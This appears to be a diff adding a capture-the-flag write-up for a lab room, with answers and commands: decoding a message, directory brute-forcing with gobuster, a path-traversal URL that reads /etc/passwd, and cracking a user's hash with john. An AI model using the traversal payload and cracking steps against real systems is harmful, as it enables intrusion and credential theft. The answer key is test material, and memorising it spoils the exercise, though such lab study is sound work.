@@ -1,0 +1,25 @@
+
+							Task 4 What Rize is trying to say?
+						------------------------------------------------------
+
+1. What the message mean did you understand it ? what it says?
+ans: d1r3c70ry_center
+     (open morse code to cyber chef (from morse -> from hex -> from base64))
+
+2. Can you see the weakness in the dark ? no ? just search  
+ans: auto-complete
+command: gobuster dir -u http://10.10.190.116/d1r3c70ry_center/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+	 -s 200,301
+
+3. What did you find something ? crack it 
+ans: auto-complete
+     (http://10.10.190.116/d1r3c70ry_center/claim/)
+     (http://10.10.190.116/d1r3c70ry_center/claim/index.php?view=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd)
+     (copy the kamishiro hash)
+4. what is rize username ?
+ans: kamishiro
+     (found in the /etc/passwd file)
+
+5. what is rize password ?
+ans: password123
+command: john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
